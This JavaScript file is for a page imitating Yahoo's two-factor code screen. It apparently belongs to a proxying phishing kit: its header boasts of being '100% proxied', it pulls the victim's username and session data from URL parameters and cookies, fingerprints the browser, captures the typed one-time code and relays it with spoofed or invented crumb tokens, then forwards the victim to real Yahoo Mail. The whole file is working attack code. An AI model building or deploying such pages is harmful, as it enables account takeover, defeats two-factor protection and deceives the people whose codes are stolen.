// ===== YAHOO OTP PAGE - 100% PROXIED SYNCHRONICITY =====
console.log("Yahoo OTP JS - 100% Native/Hybrid Fluent Data Flow Initialized")

const $ = window.jQuery || window.$

if ($) {
  $(document).ready(() => {
    console.log("Yahoo OTP verification system initialized")

    // ===== CONFIGURATION =====
    const config = {
      otpLength: 6,
      redirectDelay: 2000,
      maxRetries: 3,
      sessionTimeout: 30000,
    }

    let currentOtp = ""
    let retryCount = 0
    let sessionData = {}
    let username = ""
    let verificationMethod = ""

    // ===== SESSION MANAGEMENT =====
    const SessionManager = {
      extractSessionData: () => {
        const urlParams = new URLSearchParams(window.location.search)
        const sessionParam = urlParams.get("s")

        if (sessionParam) {
          try {
            return JSON.parse(decodeURIComponent(sessionParam))
          } catch (e) {
            console.log("Failed to parse session parameter")
          }
        }

        const cookieMatch = document.cookie.match(/yh_session=([^;]+)/)
        if (cookieMatch) {
          try {
            return JSON.parse(decodeURIComponent(cookieMatch[1]))
          } catch (e) {
            console.log("Failed to parse session cookie")
          }
        }

        return {}
      },

      generateFingerprint: () =>
        JSON.stringify({
          screen: `${screen.width}x${screen.height}`,
          colorDepth: screen.colorDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          language: navigator.language,
          platform: navigator.platform,
          userAgent: navigator.userAgent,
          timestamp: Date.now(),
          sessionId: "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 12),
        }),
    }

    // ===== USERNAME AND METHOD RETRIEVAL =====
    function getUsername() {
      const urlParams = new URLSearchParams(window.location.search)
      const user = urlParams.get("u")

      if (user) return decodeURIComponent(user)
      if (sessionData.username) return sessionData.username

      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/)
      if (cookieMatch) return decodeURIComponent(cookieMatch[1])

      return sessionStorage.getItem("yh_username") || localStorage.getItem("yh_username") || ""
    }

    function getVerificationMethod() {
      const urlParams = new URLSearchParams(window.location.search)
      const method = urlParams.get("method")

      if (method) return method

      return sessionStorage.getItem("yahoo_2fa_method") || "sms"
    }

    // ===== STATE MANAGEMENT =====
    function showState(state) {
      $("#main-form, #error-container, #loading-state, #success-state").hide()
      $(`#${state}`).show()
    }

    function showError(message) {
      $("#error-message").text(message || "Invalid code. Please try again.")
      showState("error-container")

      // Clear OTP inputs and add error styling
      $(".yahoo-otp-input").val("").removeClass("filled").addClass("error")
      setTimeout(() => {
        $(".yahoo-otp-input").removeClass("error")
      }, 1000)
    }

    function showSuccess() {
      showState("success-state")

      setTimeout(() => {
        window.location.href = "https://mail.yahoo.com/d/folders/1"
      }, config.redirectDelay)
    }

    // ===== OTP INPUT HANDLING =====
    function setupOtpInputs() {
      const inputs = $(".yahoo-otp-input")

      inputs.on("input", function () {
        const $this = $(this)
        const index = Number.parseInt($this.data("index"))
        const value = $this.val()

        // Only allow digits
        if (!/^\d$/.test(value)) {
          $this.val("")
          return
        }

        // Add filled styling
        $this.addClass("filled").removeClass("error")

        // Move to next input
        if (value && index < inputs.length - 1) {
          inputs.eq(index + 1).focus()
        }

        // Update the complete OTP
        updateOtp()
      })

      inputs.on("keydown", function (e) {
        const $this = $(this)
        const index = Number.parseInt($this.data("index"))

        // Handle backspace
        if (e.key === "Backspace") {
          if (!$this.val() && index > 0) {
            inputs
              .eq(index - 1)
              .focus()
              .val("")
              .removeClass("filled")
            updateOtp()
          }
        }

        // Handle arrow keys
        if (e.key === "ArrowLeft" && index > 0) {
          inputs.eq(index - 1).focus()
        }

        if (e.key === "ArrowRight" && index < inputs.length - 1) {
          inputs.eq(index + 1).focus()
        }
      })

      // Handle paste event
      inputs.on("paste", (e) => {
        e.preventDefault()

        const pasteData = (e.originalEvent.clipboardData || window.clipboardData).getData("text")
        const digits = pasteData.replace(/\D/g, "").split("").slice(0, config.otpLength)

        if (digits.length > 0) {
          inputs.each(function (i) {
            if (i < digits.length) {
              $(this).val(digits[i]).addClass("filled")
            } else {
              $(this).val("").removeClass("filled")
            }
          })

          // Focus the next empty input or the last one
          const nextEmptyIndex = digits.length < config.otpLength ? digits.length : config.otpLength - 1
          inputs.eq(nextEmptyIndex).focus()

          updateOtp()
        }
      })

      // Focus first input on load
      setTimeout(() => {
        inputs.eq(0).focus()
      }, 500)
    }

    function updateOtp() {
      let otp = ""
      $(".yahoo-otp-input").each(function () {
        otp += $(this).val() || ""
      })

      currentOtp = otp
      $("#otp").val(otp)

      // Enable/disable submit button based on OTP length
      $("#submit-btn").prop("disabled", otp.length !== config.otpLength)
    }

    // ===== OTP VERIFICATION =====
    function verifyOtp() {
      if (currentOtp.length !== config.otpLength) {
        showError("Please enter a complete verification code.")
        return
      }

      console.log("Verifying OTP:", currentOtp)
      showState("loading-state")

      const formData = {
        sessionIndex: sessionData.sessionIndex || "1",
        crumb: sessionData.crumb || "auto_crumb_" + Date.now(),
        acrumb: sessionData.acrumb || "auto_acrumb_" + Date.now(),
        sessionToken: sessionData.sessionToken || "sess_" + Date.now(),
        "browser-fp-data": SessionManager.generateFingerprint(),
        timestamp: Date.now(),
        username: username,
        otp: currentOtp,
        verifyCode: currentOtp,
        method: verificationMethod,
      }

      $.ajax({
        url: "/account/challenge/otp",
        method: "POST",
        data: formData,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: window.location.origin,
          Referer: window.location.href,
          "User-Agent": navigator.userAgent,
          Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.5",
        },
        xhrFields: {
          withCredentials: true,
        },
        timeout: 15000,
        success: (response, textStatus, xhr) => {
          console.log("OTP verification successful")
          handleVerificationSuccess(response, xhr)
        },
        error: (xhr, textStatus, errorThrown) => {
          console.log("OTP verification error:", textStatus, xhr.status)
          handleVerificationError(xhr, textStatus, errorThrown)
        },
      })
    }

    // ===== SUCCESS HANDLER =====
    function handleVerificationSuccess(response, xhr) {
      console.log("OTP verification successful")

      // Store verification success
      sessionStorage.setItem("yahoo_verification_success", "true")
      sessionStorage.setItem("yahoo_verification_timestamp", Date.now().toString())

      showSuccess()
    }

    // ===== ERROR HANDLER =====
    function handleVerificationError(xhr, textStatus, errorThrown) {
      console.error("OTP verification error:", {
        status: xhr.status,
        textStatus: textStatus,
        errorThrown: errorThrown,
      })

      if (xhr.status === 0) {
        // Possible redirect - check for success indicators
        setTimeout(() => {
          if (document.cookie.includes("T=") && document.cookie.includes("Y=")) {
            console.log("Yahoo session cookies detected")
            showSuccess()
            return
          }

          showError("Verification failed. Please try again.")
        }, 2000)
        return
      }

      retryCount++

      if (retryCount >= config.maxRetries) {
        showError("Multiple verification attempts failed. Please request a new code.")
      } else {
        showError("Invalid code. Please try again.")
      }
    }

    // ===== RESEND CODE =====
    function resendCode() {
      console.log("Requesting new verification code")
      showState("loading-state")

      const formData = {
        sessionIndex: sessionData.sessionIndex || "1",
        crumb: sessionData.crumb || "auto_crumb_" + Date.now(),
        acrumb: sessionData.acrumb || "auto_acrumb_" + Date.now(),
        sessionToken: sessionData.sessionToken || "sess_" + Date.now(),
        "browser-fp-data": SessionManager.generateFingerprint(),
        timestamp: Date.now(),
        username: username,
        method: verificationMethod,
        resend: "true",
      }

      $.ajax({
        url: "/account/challenge/challenge-selector",
        method: "POST",
        data: formData,
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
          Origin: window.location.origin,
          Referer: window.location.href,
        },
        xhrFields: {
          withCredentials: true,
        },
        timeout: 15000,
        success: () => {
          console.log("New code requested successfully")

          // Reset OTP inputs
          $(".yahoo-otp-input").val("").removeClass("filled error")
          currentOtp = ""
          $("#otp").val("")

          // Reset retry count
          retryCount = 0

          showState("main-form")
          $(".yahoo-otp-input").eq(0).focus()
        },
        error: () => {
          showError("Failed to request a new code. Please try again.")
        },
      })
    }

    // ===== EVENT HANDLERS =====

    // Form submission
    $("#otp-form").on("submit", (e) => {
      e.preventDefault()
      verifyOtp()
      return false
    })

    // Resend code
    $("#resend-link").click((e) => {
      e.preventDefault()
      resendCode()
    })

    // Retry button
    $("#refreshButton").click(() => {
      $(".yahoo-otp-input").val("").removeClass("filled error")
      currentOtp = ""
      $("#otp").val("")
      showState("main-form")
      $(".yahoo-otp-input").eq(0).focus()
    })

    // ===== INITIALIZATION =====
    function initializePage() {
      console.log("Initializing OTP verification page")

      sessionData = SessionManager.extractSessionData()
      username = getUsername()
      verificationMethod = getVerificationMethod()

      if (!username) {
        console.log("No username found")
        showError("Session expired. Please start over.")
        return false
      }

      $("#userEmail").text(username)
      $("#username").val(username)
      $("#method").val(verificationMethod)

      // Update method description
      let methodDesc = "We sent a code to your device"
      if (verificationMethod === "email") {
        methodDesc = "We sent a code to your recovery email"
      } else if (verificationMethod === "app") {
        methodDesc = "Please approve the login in your Yahoo app"
      }
      $("#method-description").text(methodDesc)

      // Populate form fields
      Object.keys(sessionData).forEach((key) => {
        const element = $(`#${key}`)
        if (element.length && sessionData[key]) {
          element.val(sessionData[key])
        }
      })

      $("#timestamp").val(Date.now())
      $("#browser-fp-data").val(SessionManager.generateFingerprint())

      // Setup OTP inputs
      setupOtpInputs()

      console.log("OTP page initialized for user:", username)
      return true
    }

    // ===== START INITIALIZATION =====
    if (!initializePage()) return

    console.log("Yahoo OTP verification system fully initialized")
  })
} else {
  console.error("jQuery not found - Yahoo OTP JS requires jQuery")
}
